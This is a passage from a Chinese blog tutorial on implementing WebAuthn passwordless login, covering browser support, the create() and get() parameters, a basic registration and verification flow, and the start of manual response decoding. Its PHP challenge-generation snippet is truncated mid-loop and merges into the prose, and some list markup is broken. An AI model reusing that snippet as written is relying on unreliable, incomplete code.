ID。因此我们完全可以说 WebAuthn 是安全且私密的。</p>\n<blockquote><p>为了避免用户在不同依赖方之间被追踪，认证器通常会为每个依赖方和用户的组合都创建一对公私钥。不过，由于认证器的存储空间有限，认证器通常不会存储每一个私钥，而是会通过各类信息和烧录在认证器内的主密钥“算”出对应的私钥以实现无限对公私钥。具体算法根据不同厂商会有所不同。对于 Yubikey，你可以在<a href=\"https://developers.yubico.com/U2F/Protocol_details/Key_generation.html\">这里</a>了解更多。</p></blockquote>\n<blockquote><p>如果依赖方需要，用户同意后，发送给依赖方的公钥凭证中可以包含用于辨认认证器型号的信息，不过这对隐私的影响微乎其微。</p></blockquote>\n<h2>浏览器接口</h2>\n<p>要使用 WebAuthn，我们必须要依靠浏览器作为媒介和验证器进行交互，而这就需要浏览器对于 WebAuthn 的支持了。绝大多数新版本的现代浏览器都为 WebAuthn 提供了统一的接口，而在这一段中我们会了解如何使用相关的接口。但是在开始之前，我们可以先来看看浏览器的支持程度（2020.9）。</p>\n<div class=\"mdui-table-fluid\"><table class=\"mdui-table\">\n<thead><tr>\n<th>浏览器</th>\n<th>支持情况</th>\n</tr></thead>\n<tbody>\n<tr>\n<td>桌面端 Chrome</td>\n<td>67+</td>\n</tr>\n<tr>\n<td>移动端 Chrome</td>\n<td>67+<sup>[1]</sup>\n</td>\n</tr>\n<tr>\n<td>桌面端 Firefox</td>\n<td>60+</td>\n</tr>\n<tr>\n<td>移动端 Firefox</td>\n<td>不支持<sup>[2]</sup>\n</td>\n</tr>\n<tr>\n<td>桌面端 Edge</td>\n<td>18+</td>\n</tr>\n<tr>\n<td>移动端 Edge</td>\n<td>不支持<sup>[3]</sup>\n</td>\n</tr>\n<tr>\n<td>桌面端 Safari</td>\n<td>13+</td>\n</tr>\n<tr>\n<td>移动端 Safari</td>\n<td>13.3+<sup>[4]</sup>\n</td>\n</tr>\n<tr>\n<td>桌面端 Opera</td>\n<td>54+</td>\n</tr>\n<tr>\n<td>移动端 Opera</td>\n<td>不支持</td>\n</tr>\n</tbody>\n</table></div>\n<p><sup>[1]</sup> 受平台限制，Chrome 在 iOS 平台上不支持 WebAuthn，在 Android 平台上支持大部分 WebAuthn 功能，但仍不支持部分特性（如 <code>userVerification</code>）。<br><sup>[2]</sup> 移动端 Firefox 80 以下的版本支持 WebAuthn 但似乎会忽略 <code>authenticatorAttachment</code> 等一部分参数，同时移动端 Firefox Beta 80 以下的版本支持 WebAuthn 但无法成功调用。自 80 版本起移动端 Firefox 暂时取消了对 WebAuthn 的支持（可能是 Bug）。<br><sup>[3]</sup> 移动端 Edge 似乎支持 WebAuthn 但无法成功调用。<br><sup>[4]</sup> Safari iOS/iPad OS 13 仅支持外部认证器，无法调用 Touch ID 或 Face ID；自 iOS/iPad OS 14 起 Safari 已支持全功能 WebAuthn，可以调用 Touch ID/Face ID</p>\n<p>当然，一众国产浏览器，包括 Samsung Browser 和 Yandex Browser，目前都不支持 WebAuthn。此外，由于 WebAuthn 涉及外部验证器和 TPM 可信平台模块等，用户的操作系统也会对 WebAuthn 的可用性造成影响。以下是一些需要注意的信息：</p>\n<ul>\n<li>Windows 10 1903 以下版本仅 Edge 能提供完整支持，其他浏览器只能使用 USB Key 等外部认证器；1903+ 中所有浏览器都可以通过 Windows Hello 带来完整的 WebAuthn 支持</li>\n<li>Android 需要安装并开启 Google 服务</li>\n<li>iOS/iPad OS 13.3 以下的版本不支持 WebAuthn，iOS/iPad OS 14 以下的版本支持有限（参考上文），iOS/iPad OS 14 开始 Safari 已支持全功能 WebAuthn（功能完整度甚至超过了 Android）</li>\n</ul>\n<p>可以看出，WebAuthn 的发展之路仍然很漫长，但好在桌面端对它的支持已经比较完善了，在一些情况下我们完全有理由使用它。</p>\n<hr>\n<p>来看看浏览器提供了怎么样的接口吧。要使用 WebAuthn，我们可以使用 <code>navigator.credentials.create()</code> 请求认证器生成公钥凭证和 <code>navigator.credentials.get()</code> 请求获取公钥凭证。</p>\n<blockquote><p>你或许已经对 Credential Management API 有所了解了。通过这些 API，我们还可以实现一些有趣的特性，不过这值得另开一篇文章来讲了。</p></blockquote>\n<p>对于一个基础的实现，<code>navigator.credentials.create()</code> 需要传入的参数如下：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">navigator.credentials.create({\r\n    publicKey: {\r\n        challenge,\r\n        rp: {\r\n            id,\r\n            name\r\n        },\r\n        user: {\r\n            id,\r\n            name,\r\n            displayName\r\n        },\r\n        pubKeyCredParams: [\r\n            {\r\n                type: \"public-key\",\r\n                alg\r\n            }\r\n        ],\r\n        authenticatorSelection: {\r\n            authenticatorAttachment,\r\n            userVerification\r\n        },\r\n        excludeCredentials: [\r\n            {\r\n                id,\r\n                transports: [],\r\n                type: \"public-key\"\r\n            }\r\n        ],\r\n        timeout\r\n    }\r\n})</pre>\n<p>在 <code>navigator.credentials.create()</code> 方法中，我们必须传入一个对象，其中只有一对名为 <code>publicKey</code> 的键值。这指明了我们需要创建公钥凭证，而非普通的密码凭证。然后，在 <code>publicKey</code> 对象中设置这些常用参数：</p>\n<ul>\n<li>\n<code>challenge: Uint8Array</code>：转换为 <code>Uint8Array</code> 的挑战，长度至少为 16，建议为 32</li>\n<li>\n<code>rp: Object</code>：依赖方信息，其中有一项为必须：\n<ul>\n<li>\n<code>rp.id: String</code>：（可选）依赖方 ID，必须为当前域名或为当前域名的子集的域名（不是子域名）。如域名为 <code>test.123.example.com</code>，则依赖方 ID 可以是 <code>test.123.example.com</code>, <code>123.example.com</code> 或 <code>example.com</code>。不指定则默认使用当前域名</li>\n<li>\n<code>rp.name: String</code>：依赖方名称，用于方便用户辨认</li>\n</ul>\n</li>\n<li>\n<code>user: Object</code>：用户信息，其中有三项为必须：\n<ul>\n<li>\n<code>user.id: Uint8Array</code>：转换为 <code>Uint8Array</code> 的字符串。<strong>出于安全考量，这应尽可能不与任何用户信息相关联，如不要包含用户名、用户邮箱等</strong>\n</li>\n<li>\n<code>user.name: String</code>：登录用户名</li>\n<li>\n<code>user.dispalyName: String</code>：用于显示的用户名称，显示与否的具体行为取决于浏览器</li>\n</ul>\n</li>\n<li>\n<code>pubKeyCredParams: Array</code>：一个算法列表，指明依赖方接受哪些签名算法。列表的每一项都是一个对象，拥有两个属性：\n<ul>\n<li>\n<code>pubKeyCredParams[].type: String</code>：值只能为 \"public-key\"</li>\n<li>\n<code>pubKeyCredParams[].alg: Number</code>：一个负整数，用于标明算法。具体算法对应的数字可以在 <a href=\"https://www.iana.org/assignments/cose/cose.xhtml#algorithms\">COSE</a> 找到</li>\n</ul>\n</li>\n<li>\n<code>authenticatorSelection: Object</code>：（可选）用于过滤正确的认证器，这里介绍常用的一个参数：\n<ul>\n<li>\n<code>authenticatorSelection.authenticatorAttachment: String</code>：（可选）指定要求的认证器类型。如果没有满足要求的认证器，认证可能会失败。该参数可以为 <code>null</code>（表示接受所有类型的认证器）或是以下两个值之一：\n<ul>\n<li>\n<code>platform</code>：表示仅接受平台内置的、无法移除的认证器，如手机的指纹识别设备</li>\n<li>\n<code>cross-platform</code>：表示仅接受外部认证器，如 USB Key</li>\n</ul>\n</li>\n<li>\n<code>authenticatorSelection.userVerification: String</code>：（可选）指定认证器是否需要验证“用户为本人 (User Verified, UV)”，否则只须“用户在场 (User Present, UP)”。具体验证过程取决于认证器（不同认证器的认证方法不同，也有认证器不支持用户验证），而对验证结果的处理情况则取决于依赖方。该参数可以为以下三个值之一：\n<ul>\n<li>\n<code>required</code>：依赖方要求用户验证</li>\n<li>\n<code>preferred</code>：（默认）依赖方希望有用户验证，但也接受用户在场的结果</li>\n<li>\n<code>discouraged</code>：依赖方不关心用户验证。对于 iOS/iPad OS 13，必须设置为此值，否则验证将失败</li>\n</ul>\n</li>\n</ul>\n</li>\n<li>\n<code>excludeCredentials: Array</code>：（可选）用于标识要排除的凭证，可以避免同一个用户多次注册同一个认证器。如果用户试图注册相同的认证器，用户代理会抛出 <code>InvalidStateError</code> 错误。数组中的每一项都是一个公钥凭证对象，包含以下属性：\n<ul>\n<li>\n<code>excludeCredentials[].type: String</code>：值只能为 \"public-key\"</li>\n<li>\n<code>excludeCredentials[].id: Uint8Array</code>：要排除的凭证 ID</li>\n<li>\n<code>excludeCredentials[].transports: Array</code>：（可选）用于指定该凭证所需的认证器与用户代理的通信方式，可以包含以下的一或多个字符串：\n<ul>\n<li>\n<code>usb</code>：可以通过 USB 连接的认证器</li>\n<li>\n<code>nfc</code>：可以通过 NFC 连接的认证器</li>\n<li>\n<code>ble</code>：可以通过蓝牙连接的认证器</li>\n<li>\n<code>internal</code>：平台内置的、无法移除的认证器</li>\n</ul>\n</li>\n</ul>\n</li>\n<li>\n<code>timeout: Number</code>：（可选）方法超时时间的毫秒数，超时后将强制终止 <code>create()</code> 并抛出错误。若不设置，将使用用户代理的默认值；若太大或太小，则使用最接近的用户代理默认值范围中的值。推荐值为 5000-120000</li>\n</ul>\n<blockquote><p>对于 <code>pubKeyCredParams</code>，通常我们只需添加 ES256 (alg: -7) 算法即可兼容大部分外部认证器，此外，再添加 RS256 (alg: -257) 算法即可兼容大部分平台内置认证器（如 Windows Hello）。当然，前端添加算法之后，后端也需要相应的算法支持。</p></blockquote>\n<blockquote><p>对于 <code>userVerification</code>，由于默认值 \"preferred\" 并不能很好地被所有设备支持，因此无论在 <code>create()</code> 中还是 <code>get()</code> 中不指定该参数都会在 Chrome 中触发一条警告。具体请参阅<a href=\"https://chromium.googlesource.com/chromium/src/+/master/content/browser/webauth/uv_preferred.md\">这个页面</a>。</p></blockquote>\n<p>调用 <code>create()</code> 之后，我们就可以拿到一个 <code>Promise</code>，并可以在 <code>then</code> 中获得认证器返回的 <code>PublicKeyCredential</code> 对象。以下是一个 <code>create()</code> 返回的 <code>PublicKeyCredential</code> 对象的例子：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">PublicKeyCredential {\r\n    rawId: ArrayBuffer(32) {},\r\n    response: AuthenticatorAttestationResponse {\r\n        attestationObject: ArrayBuffer(390) {},\r\n        clientDataJSON: ArrayBuffer(121) {}\r\n    },\r\n    id: \"VByF2w2hDXkVsevQFZdbOJdyCTGOrI1-sVEzOzsNnY0\",\r\n    type: \"public-key\"\r\n}</pre>\n<p>其中有：</p>\n<ul>\n<li>\n<code>id: String</code>：Base64URL 编码的凭证 ID</li>\n<li>\n<code>rawId: ArrayBuffer</code>：<code>ArrayBuffer</code> 的原始凭证 ID</li>\n<li>\n<code>type: String</code>：一定是 \"public-key\"</li>\n<li>\n<code>response: Object</code>：<code>AuthenticatorAttestationResponse</code> 对象，是 <code>PublicKeyCredential</code> 的主要部分，包含以下两个内容：\n<ul>\n<li>\n<code>response.clientDataJSON: ArrayBuffer</code>：客户端数据，包含 origin（即凭证请求来源）、挑战等信息</li>\n<li>\n<code>response.attestationObject: ArrayBuffer</code>：CBOR 编码的认证器数据，包含凭证公钥、凭证 ID、签名（如果有）、签名计数等信息</li>\n</ul>\n</li>\n</ul>\n<p>然后将 <code>ArrayBuffer</code> 们以合适的方式编码成字符串，我们就可以把 <code>PublicKeyCredential</code> 发送给依赖方以供验证与注册了。具体怎么操作，我们会在下文详细讨论。当然，别忘了 <code>catch()</code> 注册过程中抛出的任何错误。</p>\n<blockquote><p>你可能会认为在所有情况下，注册时认证器都会对挑战进行签名。实际上在大部分情况下（同时也是默认情况），<strong>注册时认证器并不会对挑战进行签名</strong>，<code>attestationObject</code> 并不会包含签名后的挑战。只有依赖方明确要求证明且用户同意（部分浏览器要求）后认证器才会对挑战进行签名（具体实现据情况会有所不同）。对此，<a href=\"https://developer.mozilla.org/en-US/docs/Web/API/Web_Authentication_API/Attestation_and_Assertion#Attestation\">MDN 解释道</a>“大部分情况下，用户注册公钥时我们会使用「初次使用时信任模型」(TOFU) ，此时验证公钥是没有必要的。”要了解更多关于证明的内容，请参阅“<a href=\"https://flyhigher.top/#verify-authenticator\">验证认证器</a>”一节。</p></blockquote>\n<p>而对于 <code>navigator.credentials.get()</code>，我们可以传入如下的参数：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">navigator.credentials.get({\r\n    publicKey: {\r\n        challenge,\r\n        rpId,\r\n        userVerification,\r\n        allowCredentials: [\r\n            {\r\n                id,\r\n                transports: [],\r\n                type: \"public-key\"\r\n            }\r\n        ],\r\n        timeout\r\n    }\r\n})</pre>\n<p>和 <code>create()</code> 一样，对于 <code>get()</code> 我们需要传入一个对象，其中只有一对名为 <code>publicKey</code> 的键值，指明我们需要获取的是公钥凭证而非普通的密码凭证。在 <code>publicKey</code> 对象中我们可以设置这些常用参数：</p>\n<ul>\n<li>\n<code>challenge: Uint8Array</code>：转换为 <code>Uint8Array</code> 的挑战，长度至少为 16，建议为 32</li>\n<li>\n<code>rpID: String</code>：（可选）依赖方 ID，需要和注册认证器时的一致。规则和上述的 <code>rp.id</code> 一致，不指定默认使用当前域名</li>\n<li>\n<code>userVerification: String</code>：和上文一样，只是需要注意它这次不在 <code>authenticatorSelection</code> 中了</li>\n<li>\n<code>allowCredentials: Array</code>：（可选）用于标识允许的凭证 ID，使用户代理找到正确的认证器。只有符合这个列表中凭证 ID 的凭证才能被成功返回。数组中的每一项都是对象，包含以下属性：\n<ul>\n<li>\n<code>allowCredentials[].type: String</code>：值只能为 \"public-key\"</li>\n<li>\n<code>allowCredentials[].id: Uint8Array</code>：允许的凭证 ID</li>\n<li>\n<code>allowCredentials[].transports: Array</code>：（可选）用于指定该凭证所需的认证器与用户代理的通信方式，可以包含以下的一或多个字符串：\n<ul>\n<li>\n<code>usb</code>：可以通过 USB 连接的认证器</li>\n<li>\n<code>nfc</code>：可以通过 NFC 连接的认证器</li>\n<li>\n<code>ble</code>：可以通过蓝牙连接的认证器</li>\n<li>\n<code>internal</code>：平台内置的、无法移除的认证器</li>\n</ul>\n</li>\n</ul>\n</li>\n<li>\n<code>timeout: Number</code>：（可选）方法超时时间的毫秒数，和上面的一样，推荐值为 5000-120000</li>\n</ul>\n<p>嗯，要传入的参数少多了。之后，和 <code>create()</code> 一样，调用 <code>get()</code> 之后，我们就可以拿到一个 <code>Promise</code> 并在 <code>then</code> 中获得认证器返回的 <code>PublicKeyCredential</code> 对象。以下是一个 <code>get()</code> 返回的 <code>PublicKeyCredential</code> 对象的例子：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">PublicKeyCredential {\r\n    rawId: ArrayBuffer(32) {},\r\n    response: AuthenticatorAssertionResponse {\r\n        authenticatorData: ArrayBuffer(37) {},\r\n        signature: ArrayBuffer(256) {},\r\n        userHandle: ArrayBuffer(64) {},\r\n        clientDataJSON: ArrayBuffer(118) {}\r\n    }\r\n    id: \"VByF2w2hDXkVsevQFZdbOJdyCTGOrI1-sVEzOzsNnY0\"\r\n    type: \"public-key\"\r\n}</pre>\n<p>这里的东西就比 <code>create()</code> 时拿到的要多了。看看我们拿到了什么吧：</p>\n<ul>\n<li>\n<code>id: String</code>：Base64URL 编码的凭证 ID</li>\n<li>\n<code>rawId: ArrayBuffer</code>：<code>ArrayBuffer</code> 的原始凭证 ID</li>\n<li>\n<code>type: String</code>：一定是 \"public-key\"</li>\n<li>\n<code>response: Object</code>：对于验证流程，认证会返回 <code>AuthenticatorAssertionResponse</code> 而不是 <code>AuthenticatorAttestationResponse</code> 对象，这个对象包含以下 4 个属性：\n<ul>\n<li>\n<code>response.authenticatorData: ArrayBuffer</code>：认证器信息，包含认证状态、签名计数等</li>\n<li>\n<code>response.signature: ArrayBuffer</code>：被认证器签名的 <code>authenticatorData</code> + <code>clientDataHash</code>（<code>clientDataJSON</code> 的 SHA-256 hash）</li>\n<li>\n<code>response.userHandle: ArrayBuffer</code>：<code>create()</code> 创建凭证时的用户 ID <code>user.id</code>。许多 U2F 设备不支持这一特性，这一项将会是 <code>null</code>\n</li>\n<li>\n<code>response.clientDataJSON: ArrayBuffer</code>：客户端数据，包含 origin（即凭证请求来源）、挑战等信息</li>\n</ul>\n</li>\n</ul>\n<p>同样地，我们将 <code>ArrayBuffer</code> 们以合适的方式编码成字符串后就可以把 <code>PublicKeyCredential</code> 发送给依赖方以供验证了。至于具体怎么做，别急，马上就来讲一讲。</p>\n<h2>简单实现</h2>\n<p>了这么多，我们终于可以实现一个简单的 WebAuthn 认证页面了。由于在实际操作中 WebAuthn 相关的数据解码和密码计算比较复杂，在服务器端我们可以使用第三方库来帮我们做这些脏活累活，我们只需专注于具体流程就可以了。</p>\n<p>要寻找可用的第三方库，你可以在 <a href=\"https://webauthn.io/\">webauthn.io</a> 上找到适用于各种语言的第三方库——除了 PHP（笑）。不过好在你可以在 GitHub 上找到几个不错的 PHP WebAuthn 库，比如 <a href=\"https://github.com/web-auth/webauthn-framework\">web-auth/webauthn-framework</a>。</p>\n<p>在我们的这个例子中，我们关心的主要是前端逻辑；而后端我们可以使用各类几乎已经做到开箱即用的第三方库，这样我们可以专注于流程而不必关心细节。当然如果你想了解后端的解码细节，可以阅读“<a href=\"https://flyhigher.top/#webauthn-decode\">手动解个码</a>”一节。</p>\n<hr>\n<p>让我们先从注册开始吧。现在，用户点击了注册认证器的按钮，一个请求被发送给服务器（也就是依赖方）。在最简单的情况中，依赖方需要将三个内容发送给浏览器：<strong>挑战、用户信息和用户已注册的凭证 ID 列表（即 <code>excludeCredentials</code>）</strong>。当然依赖方也可以自由选择发送更多信息，只要最终前端能构建合法的参数即可。</p>\n<p>挑战最终会被转换为 <code>Uint8Array</code>，即一组 0-255 的整数。如果使用 PHP，在后端我们可以这样生成 Base64 编码的挑战：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"php\">$challenge = \"\";\r\nfor($i = 0; $i \n<p>对于用户信息，我们需要登录名、显示名称和 ID 三项内容。我们可以从数据库中取出用户信息，也可以新建一份。需要注意的是，<strong>出于安全和隐私的考量，ID 不应该包含用户的任何信息，比如用户邮箱等。</strong>推荐的做法是和挑战一样，生成一个随机字符串/一组随机数，并将其于用户关联起来以供之后使用。</p>\n<p>发送已注册的凭证 ID 列表是为了防止用户重复注册同一个认证器。正确设置该列表后，如果用户试图注册同一个认证器，浏览器会中止流程并抛出 <code>InvalidStateError</code>。</p>\n<p>最后，别忘了将挑战等一些后续可能会用到的信息临时存储起来。Session 就是一个很好的选择。</p>\n<p>将所有信息发送到浏览器之后，我们应该可以构建出新建凭证所需的参数了。由于有多个参数需要以 <code>Uint8Array</code> 的形式传入，我们可以准备一个简单的工具函数帮我们将 Base64 的字符串转为 <code>Uint8Array</code>。</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">function str2ab(str){\r\n    return Uint8Array.from(window.atob(str), c=&gt;c.charCodeAt(0));\r\n}</pre>\n<p>除了 <code>challenge</code>, <code>rp</code>, <code>user</code> 和 <code>excludeCredentials</code> 几部分需要你根据具体情况设置外，上文提到的其他参数一般可以这么设置：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">publicKey: {\r\n    challenge, // 自行设置\r\n    rp, // 自行设置\r\n    user, // 自行设置\r\n    pubKeyCredParams: [\r\n        {\r\n            type: \"public-key\",\r\n            alg: -7 // ES256\r\n        },\r\n        {\r\n            type: \"public-key\",\r\n            alg: -257 // RS256\r\n        }\r\n    ],\r\n    authenticatorSelection: {\r\n        userVerification: \"discouraged\",\r\n        authenticatorAttachment: null // 除非用户指定，大部分情况下无需指定\r\n    },\r\n    excludeCredentials, // 自行设置\r\n    timeout: 60000\r\n}</pre>\n<p>然后就是传入 <code>navigator.credentials.create()</code>，拿到 <code>PublicKeyCredential</code>。如果一切顺利，接下来我们就需要考虑如何将返回的内容传回依赖方了。由于我们拿到的很多都是 <code>ArrayBuffer</code>，我们需要将其进行编码。再准备一个工具函数吧：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">function array2b64String(a) {\r\n    return window.btoa(String.fromCharCode(...a));\r\n}</pre>\n<p>然后适当处理，我们就可以得到一个方便传输的 JSON 字符串了：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">navigator.credentials.create({publicKey}).then((credentialInfo) =&gt; {\r\n    const publicKeyCredential = {\r\n        id: credentialInfo.id,\r\n        type: credentialInfo.type,\r\n        rawId: array2b64String(new Uint8Array(credentialInfo.rawId)),\r\n        response: {\r\n            clientDataJSON: array2b64String(new Uint8Array(credentialInfo.response.clientDataJSON)),\r\n            attestationObject: array2b64String(new Uint8Array(credentialInfo.response.attestationObject))\r\n        }\r\n    };\r\n    return publicKeyCredential;\r\n}).then(JSON.stringify).then((authenticatorResponseJSON) =&gt; {\r\n    // 可以发送了\r\n}).catch((error) =&gt; {\r\n    console.warn(error); // 捕获错误\r\n})</pre>\n<p>依赖方收到数据以后，还需要做三件事：验证挑战、存储凭证 ID 和存储公钥。如果数据解码顺利，且收到的挑战和之前发送的一致，就可以认为注册成功，将凭证 ID 及公钥与用户关联起来。这一步有很多第三方库可以帮我们做，对于基础实现我们就不深入探究了。</p>\n<blockquote><p>由于不同厂商的认证器的实现方式不同，<strong>我们并不能保证凭证 ID 一定是全局唯一的</strong>，也就是说，凭证 ID 有可能碰撞——即使这些凭证实际上是不同的。依赖方在实现凭证 ID 的存储及查找时，需要注意和用户 ID 结合进行存储或查找，或是直接在注册认证器时在服务器端对比阻止相同的凭证 ID。</p></blockquote>\n<hr><p>接下来就可以进行验证了。某天，用户点击了验证按钮准备登录，于是浏览器发送了验证请求到依赖方，同时附上要登录的用户名。接下来依赖方至少需要发送两项内容给浏览器：<strong>挑战和用户已绑定的凭证 ID 列表（即 <code>allowCredentials</code>）。</strong></p>\n<p>之后前端的处理流程就和注册时基本一致了。只是需要注意验证流程中获取到的 <code>PublicKeyCredential</code> 的结构和注册时的稍有不同。</p>\n<p>当浏览器将数据传回后，依赖方需要做的事情就比之前要麻烦一些了。依赖方需要验证挑战，并用之前存储的公钥验证签名和签名计数。同样地，这一步有很多第三方库可以帮我们做。最后，如果验证全部通过，我们就可以允许用户登录了。</p>\n<p>到目前为止，我们已经实现了一个简单的 WebAuthn 验证服务。不过这只是一个最基础的实现，对于很多高安全要求的身份认证这是远远不够的。因此，我们需要摆脱对第三方库的依赖，深入了解 WebAuthn。你可以继续阅读“<a href=\"https://flyhigher.top/#deep-into-webauthn\">深入了解 WebAuthn</a>”部分，不过对于基础的 WebAuthn 实现，我们的旅程就到这里了。</p>\n<h2>拓展阅读</h2>\n<p>如果你的目标只是快速了解如何开发 WebAuthn，那么你阅读到这里就可以了。同时，上一节例子中的部分代码来自于我为了这篇文章开发的 WordPress 插件 WP-WebAuthn，这个插件可以为你的 WordPress 启用 WebAuthn 无密码登录（并非二步验证），你可以查阅插件的 <a href=\"https://github.com/yrccondor/wp-webauthn\">GitHub 存储库</a>了解更多，也可以自己安装试一试。</p>\n<p>如果你正在使用 Chrome 开发，Chrome 87+ 版本添加了一个 WebAuthn 开发者面板，可以帮助你在没有任何实体验证器的情况下开发 WebAuthn 功能。你可以在 Google 的<a href=\"https://developers.google.com/web/tools/chrome-devtools/webauthn\">这篇文章</a>中了解更多。不够，如果你正在使用 Firefox，很遗憾目前我还没有找到对应的开发工具或是浏览器扩展可用。</p>\n<p>如果你希望了解更多关于非对称加密的数学证明，可以查阅阮一峰老师的<a href=\"http://www.ruanyifeng.com/blog/2013/06/rsa_algorithm_part_one.html\">这篇文章</a>。</p>\n<p>如果你希望了解更多关于 Credential Management API 的信息，可以查阅<a href=\"https://medium.com/dev-channel/sign-in-on-the-web-credential-management-api-and-best-practices-d21aed14b6fe\">这篇文章</a>（英文）。</p>\n<p>如果你希望了解更多 WebAuthn 的细节，可以继续往下阅读。<span></span></p>\n<h1>深入了解 WebAuthn</h1>\n<p>如上文所说，如果摆脱对第三方库的依赖，或是要实现更安全的 WebAuthn，我们必须深入了解 WebAuthn。在这一部分中，我们会详细讨论上文没有提到的一些概念和参数，并了解 WebAuthn 中各类数据的结构以实现解码与验证。先来看一看一些进阶的选项吧。</p>\n<h2>进阶选项</h2>\n<p>没错，上文提到的传入 <code>navigator.credentials.create()</code> 和 <code>navigator.credentials.get()</code> 方法的参数其实只是所有参数的一部分。对于 <code>create()</code>，我们还可以配置这些可选内容（上文提及的已省略）：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">navigator.credentials.create({\r\n    publicKey: {\r\n        rp: {\r\n            icon\r\n        },\r\n        user: {\r\n            icon\r\n        },\r\n        attestation,\r\n        authenticatorSelection: {\r\n            requireResidentKey\r\n        },\r\n        extensions\r\n    }\r\n})</pre>\n</pre>\n<ul>\n<li>\n<code>rp.icon: String</code> 和 <code>user.icon</code>：是的，你可以为依赖方和用户设置图标，可以使用 HTTPS URL 或 Base64，一般长度不能超过 128 字节，不过大部分浏览器不会显示图标，或是有非常小的图片体积限制，所以一般没有使用这一属性的必要</li>\n<li>\n<code>attestation: String</code>：表明依赖方是否需要证明。可选三个值：\n<ul>\n<li>\n<code>none</code>：（默认）不需要证明。如上文所述，依赖方不关心证明，因此认证器不会签名。对于 iOS/iPad OS 13，必须设置为此值，否则验证将失败</li>\n<li>\n<code>indirect</code>：依赖方需要证明，但证明方式可由认证器选择。在支持匿名证明的认证器上，认证器会通过匿名证明的方式签名挑战，并向依赖方提供签名方式等信息</li>\n<li>\n<code>direct</code>：依赖方要求直接证明。此时认证器会使用烧录在认证器中的公钥进行签名，同时向依赖方提供签名方式等信息以供依赖方验证认证器是否可信。更多信息可以阅读“<a href=\"https://flyhigher.top/#verify-authenticator\">验证认证器</a>”一节</li>\n</ul>\n</li>\n<li>在 <code>authenticatorSelection</code> 中，我们还可以设置两个可选属性：\n<ul>\n<li>\n<code>authenticatorSelection.requireResidentKey: Boolean</code>：是否要求将私钥钥永久存储于认证器中。默认值为 <code>false</code>。对于 iOS/iPad OS 13，必须设置为 <code>false</code>，否则验证将失败</li>\n</ul>\n</li>\n</ul>\n<li>\n<code>extensions: Object</code>：WebAuthn 扩展，可以提供规范之外的配置和响应。由于实际情况中很少会使用这一特性，我们不会在这篇文章中讨论它</li>\n\n<blockquote><p>将 <code>requireResidentKey</code> 设置为 <code>true</code> 可以实现无用户名的登录，即认证器同时替代了用户名和密码。需要注意的是，尽管大部分认证器可以实现无限对公私钥，<strong>但能永久存储的私钥数量是有限的</strong>（对于 Yubikey，这通常是 25），因此只应在真正需要的时候启用此特性。我们会在“<a href=\"https://flyhigher.top/#login-without-username\">无用户名登录</a>”一节中详细讨论原因。</p></blockquote>\n<blockquote><p><strong>如果你没有高安全需求（如银行交易等），请不要向认证器索取证明</strong>，即将 <code>attestation</code> 设置为 \"none\"。对于普通身份认证来说，要求证明不必要的，且会有浏览器提示打扰到用户。</p></blockquote>\n<blockquote><p>Android 暂时无法实施用户验证，进而会导致依赖方验证失败。你可以在<a href=\"https://bugs.chromium.org/p/chromium/issues/detail?id=997538\">这里</a>追踪这个特性的实现情况。</p></blockquote>\n<blockquote>\n<p>对于 <code>extensions</code>，由于目前浏览器支持和应用范围有限，我们不会在这篇文章中涉及，不过你可以看一个例子：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">extensions: {\r\n    uvm: true, // 要求认证器返回用户进行验证的方法\r\n    txAuthSimple: \"Please proceed\" // 在认证器上显示与交易有关的简短消息\r\n}</pre>\n<p>你可以在<a href=\"https://www.w3.org/2019/01/webauthn-extensions.html\">这个页面</a>了解更多关于 <code>extensions</code> 的信息。</p>\n</blockquote>\n<p>对于 <code>get()</code>，我们其实只有一个可选内容没讲了，即 <code>extensions</code>。和上文一样，我们不会在这篇文章中讨论它。</p>\n<p>就这些了！<span></span></p>\n<h2>手动解个码</h2>\n<p>是时候看看如何手动解码了。我们将会在这一节中讨论认证器返回的数据的结构以及如何正确地解码它们。</p>\n<p>首先我们来看看如何处理注册过程中认证器发回的数据。假设所有 <code>ArrayBuffer</code> 类型的值都被正确地以 Base64 编码，且后端已经将 JSON 的字符串解析为字典。先来复习一下，我们得到的数据应该是这样的（数据较长，已省略一部分）：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">{\r\n    id: \"ZRBkDBCEtq...9XY8atOcbg\",\r\n    type: \"public-key\",\r\n    rawId: \"ZRBkDBCEtq...9XY8atOcbg==\",\r\n    response: {\r\n        clientDataJSON: \"eyJjaGFsbGVuZ2U...i5jcmVhdGUifQ==\",\r\n        attestationObject: \"o2NmbXRkbm9uZWd...xNHuAMzz2LxZA==\"\r\n    }\r\n}</pre>\n<p>这里的 <code>id</code> 就是凭证的 ID，如果验证正确，我们最终要将它存储起来并于用户关联。同时可以看到 Base64 编码后的 <code>rawId</code> 其实和 <code>id</code> 是一致的（不过 <code>id</code> 是 Base64URL 编码的）。而 <code>type</code> 则一定是 \"public-key\"。</p>\n<p>不过，我们主要关心的还是 <code>respose</code> 中的两项内容。首先是 <code>clientDataJSON</code>。它的处理比较简单，看名字就知道，它应该是一个 JSON 字符串。</p>\n<blockquote><p>小技巧：如果你看到一个 Base64 编码的字符串以 \"ey\" 开头，那么它大概率是一个 Base64 编码的 JSON。</p></blockquote>\n<p>将<code>clientDataJSON</code> Base64 解码再 JSON 解码之后我们就能得到一个字典：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">{\r\n    challenge: \"NI4i1vsNmP2KHcmyFnBCKRVQPfHgg34SsYZUOPZY2lM\",\r\n    extra_keys_may_be_added_here: \"do not compare clientDataJSON against a template. See https://goo.gl/yabPex\",\r\n    origin: \"https://dev.axton.cc\",\r\n    type: \"webauthn.create\"\r\n}</pre>\n<p>结构一目了然。在这里，我们需要验证三项内容：</p>\n<ul>\n<li>\n<code>challenge</code> 和之前发送的一致</li>\n<li>\n<code>origin</code> 